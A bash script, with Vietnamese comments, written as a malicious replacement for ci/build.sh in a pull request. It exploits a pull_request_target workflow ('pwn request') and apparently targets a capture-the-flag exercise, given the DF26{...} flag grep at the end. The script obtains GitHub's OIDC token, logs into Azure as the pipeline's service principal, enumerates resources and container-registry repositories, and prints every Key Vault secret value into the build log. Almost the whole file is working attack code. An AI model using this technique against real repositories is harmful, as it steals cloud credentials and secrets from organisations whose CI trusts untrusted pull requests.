#!/usr/bin/env bash
# ci/build.sh thay the, dat trong pull request gui toi duyhhh-oss/tebamoto-platform
#
# Khai thac pwn request: workflow dung pull_request_target, checkout ma cua PR
# roi chay chinh file nay, nen file nay chay voi:
#   - vars.AZURE_CLIENT_ID / AZURE_TENANT_ID / AZURE_SUBSCRIPTION_ID
#   - quyen id-token: write  (duc duoc OIDC token cho Azure)
#
# CHI DOC. Khong tao, khong sua, khong xoa bat ky tai nguyen Azure nao.

set -uo pipefail

echo "=============== 1. Doi OIDC token cua GitHub lay quyen Azure ==============="
OIDC=$(curl -sS \
  -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | jq -r '.value')

echo "do dai OIDC token: ${#OIDC}"

az login --service-principal \
  --username "${AZURE_CLIENT_ID}" \
  --tenant   "${AZURE_TENANT_ID}" \
  --federated-token "${OIDC}" >/dev/null 2>&1

echo "--- danh tinh dang dung ---"
az account show -o json

echo
echo "=============== 2. Tai nguyen trong subscription ==============="
az resource list -o json | jq -r '.[] | "\(.type)\t\(.name)\t\(.location)\ttags=\(.tags)"'

echo
echo "=============== 3. Container Registry ==============="
REG=crtblplatprodx3euoz
az acr repository list -n "${REG}" -o tsv | while read -r R; do
  echo "--- repository: ${R} ---"
  az acr repository show -n "${REG}" --repository "${R}" -o json
  az acr repository show-tags -n "${REG}" --repository "${R}" --detail -o json
done

echo
echo "=============== 4. Key Vault ==============="
az keyvault list -o tsv --query '[].name' | while read -r V; do
  echo "--- vault: ${V} ---"
  az keyvault secret list --vault-name "${V}" -o tsv --query '[].name' | while read -r SN; do
    echo "secret ${SN}:"
    az keyvault secret show --vault-name "${V}" --name "${SN}" --query value -o tsv
  done
done

echo
echo "=============== 5. Loc chuoi co dang flag ==============="
{
  az resource list -o json
  az acr repository list -n "${REG}" -o json
} 2>/dev/null | grep -Eo 'DF26\{[^}]*\}' | sort -u
echo "xong"
